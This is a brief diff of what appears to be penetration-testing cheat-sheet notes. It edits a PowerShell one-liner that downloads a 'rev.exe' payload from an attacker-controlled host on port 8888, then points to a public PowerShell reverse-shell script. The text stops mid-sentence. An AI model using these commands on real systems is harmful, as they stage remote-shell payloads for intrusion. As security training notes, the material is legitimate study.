@@ -3,7 +3,7 @@
 - Powershell equivalent of `wget`
 
 ```powershell
-powershell "(New-Object Net.WebClient).Downloadfile('http://$ip:8888/rev.exe','rev.exe')"
+powershell (New-Object Net.WebClient).Downloadfile('http://$ip:8888/rev.exe','rev.exe')
 ```
 
 - Powershell reverse shell can be found at [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Connect to listener using
